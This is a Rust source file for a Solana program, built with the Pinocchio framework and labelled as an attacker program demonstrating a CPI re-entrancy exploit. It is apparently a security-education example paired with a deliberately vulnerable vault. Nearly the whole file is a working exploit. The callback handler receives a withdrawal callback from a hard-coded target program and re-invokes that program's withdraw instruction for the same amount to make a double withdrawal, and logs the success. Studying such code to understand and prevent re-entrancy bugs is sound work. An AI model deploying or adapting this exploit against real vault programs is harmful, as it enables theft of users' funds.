//! # Pinocchio Attacker Program for CPI Re-entrancy Attack
//!
//! This program demonstrates how a malicious program can exploit re-entrancy
//! vulnerabilities in other Solana programs through CPI callbacks.
//!
//! **DO NOT USE THIS CODE FOR MALICIOUS PURPOSES.**
//! This is strictly for educational and security research purposes.

#![allow(unexpected_cfgs)]

use pinocchio::{
    cpi::invoke,
    entrypoint,
    error::ProgramError,
    instruction::{InstructionAccount, InstructionView},
    AccountView, Address, ProgramResult,
};
use solana_program_log::log;

// =============================================================================
// PROGRAM ID
// =============================================================================

/// Program ID: Czak4jHPLpBDrWLjkfPMRaUgYnyVWUuiMsWn3vbqyujM
pub const ID: Address = Address::new_from_array([
    0xb2, 0x30, 0xd0, 0xa7, 0xc1, 0x9f, 0x29, 0x1b, 0xce, 0xad, 0xe9, 0x4e, 0x70, 0xb0, 0xab, 0x55,
    0x46, 0x8b, 0x26, 0xaf, 0xa3, 0x94, 0x28, 0x94, 0x5a, 0x44, 0x0f, 0x9c, 0xf2, 0xfe, 0xd7, 0x28,
]);

/// Vulnerable program ID for CPI re-entry attack
pub const VULNERABLE_PROGRAM_ID: Address = Address::new_from_array([
    0x8b, 0x50, 0x39, 0x44, 0xbd, 0x2c, 0x9f, 0xda, 0x63, 0x63, 0x32, 0xcb, 0xd8, 0xa8, 0xdf, 0x0b,
    0xa1, 0x41, 0x26, 0xba, 0x38, 0xad, 0xcf, 0xa0, 0xe8, 0x54, 0x61, 0xfa, 0xc6, 0xb7, 0x59, 0xf9,
]);

// =============================================================================
// CONSTANTS
// =============================================================================

/// AttackState account size
pub const ATTACK_STATE_SIZE: usize = 1 + 8 + 1;

/// Withdraw discriminator for the vulnerable program
pub const VULNERABLE_WITHDRAW_DISCRIMINATOR: u8 = 2;

// =============================================================================
// INSTRUCTION DISCRIMINATORS
// =============================================================================

pub const RECEIVE_CALLBACK_DISCRIMINATOR: u8 = 0;
pub const INITIALIZE_ATTACK_DISCRIMINATOR: u8 = 1;
pub const RESET_ATTACK_DISCRIMINATOR: u8 = 2;

// =============================================================================
// DATA STRUCTURES
// =============================================================================

/// Tracks attack state to prevent infinite recursion
pub struct AttackState {
    pub reentered: bool,
    pub attack_count: u64,
    pub bump: u8,
}

impl AttackState {
    pub fn try_from_slice(data: &[u8]) -> Result<Self, ProgramError> {
        if data.len() < ATTACK_STATE_SIZE {
            return Err(ProgramError::InvalidAccountData);
        }

        let reentered = data[0] != 0;
        let attack_count = u64::from_le_bytes(
            data[1..9].try_into().map_err(|_| ProgramError::InvalidAccountData)?,
        );
        let bump = data[9];

        Ok(Self { reentered, attack_count, bump })
    }

    pub fn serialize(&self, data: &mut [u8]) -> Result<(), ProgramError> {
        if data.len() < ATTACK_STATE_SIZE {
            return Err(ProgramError::AccountDataTooSmall);
        }

        data[0] = if self.reentered { 1 } else { 0 };
        data[1..9].copy_from_slice(&self.attack_count.to_le_bytes());
        data[9] = self.bump;

        Ok(())
    }
}

// =============================================================================
// ENTRYPOINT
// =============================================================================

entrypoint!(process_instruction);

pub fn process_instruction(
    program_id: &Address,
    accounts: &[AccountView],
    instruction_data: &[u8],
) -> ProgramResult {
    let (discriminator, data) =
        instruction_data.split_first().ok_or(ProgramError::InvalidInstructionData)?;

    match *discriminator {
        RECEIVE_CALLBACK_DISCRIMINATOR => receive_callback(accounts, data),
        INITIALIZE_ATTACK_DISCRIMINATOR => initialize_attack(program_id, accounts, data),
        RESET_ATTACK_DISCRIMINATOR => reset_attack(program_id, accounts),
        _ => Err(ProgramError::InvalidInstructionData),
    }
}

// =============================================================================
// INSTRUCTIONS
// =============================================================================

fn initialize_attack(program_id: &Address, accounts: &[AccountView], data: &[u8]) -> ProgramResult {
    let [attack_state_acc, attacker] = accounts else {
        return Err(ProgramError::NotEnoughAccountKeys);
    };

    if !attacker.is_signer() {
        return Err(ProgramError::MissingRequiredSignature);
    }

    if !attack_state_acc.owned_by(program_id) {
        return Err(ProgramError::IllegalOwner);
    }

    let bump = if data.is_empty() { 0 } else { data[0] };

    let attack_state = AttackState { reentered: false, attack_count: 0, bump };

    let mut account_data = attack_state_acc.try_borrow_mut()?;
    attack_state.serialize(&mut account_data)?;

    log!("// ATTACK: Attack state initialized");

    Ok(())
}

fn reset_attack(program_id: &Address, accounts: &[AccountView]) -> ProgramResult {
    let [attack_state_acc, attacker] = accounts else {
        return Err(ProgramError::NotEnoughAccountKeys);
    };

    if !attacker.is_signer() {
        return Err(ProgramError::MissingRequiredSignature);
    }

    if !attack_state_acc.owned_by(program_id) {
        return Err(ProgramError::IllegalOwner);
    }

    let state_data = attack_state_acc.try_borrow()?;
    let current_state = AttackState::try_from_slice(&state_data)?;
    drop(state_data);

    let attack_state = AttackState { reentered: false, attack_count: 0, bump: current_state.bump };

    let mut account_data = attack_state_acc.try_borrow_mut()?;
    attack_state.serialize(&mut account_data)?;

    log!("// ATTACK: Attack state reset");

    Ok(())
}

/// ATTACK: Receive callback from vulnerable vault and re-enter.
fn receive_callback(accounts: &[AccountView], data: &[u8]) -> ProgramResult {
    log!("// ATTACK: ====== CALLBACK RECEIVED ======");

    let [vault, user_deposit, authority, vulnerable_program, attack_state_acc, attacker_program] =
        accounts
    else {
        return Err(ProgramError::NotEnoughAccountKeys);
    };

    if !authority.is_signer() {
        return Err(ProgramError::MissingRequiredSignature);
    }

    if data.len() < 8 {
        return Err(ProgramError::InvalidInstructionData);
    }
    let amount = u64::from_le_bytes(
        data[0..8].try_into().map_err(|_| ProgramError::InvalidInstructionData)?,
    );

    log!("// ATTACK: Amount from original withdrawal: {}", amount);

    let state_data = attack_state_acc.try_borrow()?;
    let mut attack_state = AttackState::try_from_slice(&state_data)?;
    drop(state_data);

    if attack_state.reentered {
        log!("// ATTACK: Already re-entered once, stopping");
        attack_state.attack_count += 1;

        let mut state_data = attack_state_acc.try_borrow_mut()?;
        attack_state.serialize(&mut state_data)?;

        return Ok(());
    }

    attack_state.reentered = true;
    attack_state.attack_count += 1;

    let mut state_data = attack_state_acc.try_borrow_mut()?;
    attack_state.serialize(&mut state_data)?;
    drop(state_data);

    log!("// ATTACK: State still shows old balance - time to exploit!");

    // Build instruction data: discriminator (1 byte) + amount (8 bytes)
    let mut instruction_data = [0u8; 9];
    instruction_data[0] = VULNERABLE_WITHDRAW_DISCRIMINATOR;
    instruction_data[1..9].copy_from_slice(&amount.to_le_bytes());

    let ix_accounts = [
        InstructionAccount::writable(vault.address()),
        InstructionAccount::writable(user_deposit.address()),
        InstructionAccount::readonly_signer(authority.address()),
        InstructionAccount::readonly(attacker_program.address()),
        InstructionAccount::readonly(vulnerable_program.address()),
        InstructionAccount::writable(attack_state_acc.address()),
    ];

    let reentry_ix = InstructionView {
        program_id: &VULNERABLE_PROGRAM_ID,
        accounts: &ix_accounts,
        data: &instruction_data,
    };

    log!("// ATTACK: Executing re-entrancy CPI - DOUBLE WITHDRAWAL!");

    invoke::<6>(
        &reentry_ix,
        &[vault, user_deposit, authority, attacker_program, vulnerable_program, attack_state_acc],
    )?;

    log!("// ATTACK: ====== RE-ENTRANCY SUCCESSFUL! ======");

    Ok(())
}

// =============================================================================
// TESTS
// =============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_attack_state_serialization() {
        let attack_state = AttackState { reentered: true, attack_count: 5, bump: 255 };

        let mut buffer = [0u8; ATTACK_STATE_SIZE];
        attack_state.serialize(&mut buffer).unwrap();

        let deserialized = AttackState::try_from_slice(&buffer).unwrap();
        assert_eq!(deserialized.reentered, attack_state.reentered);
        assert_eq!(deserialized.attack_count, attack_state.attack_count);
        assert_eq!(deserialized.bump, attack_state.bump);
    }
}
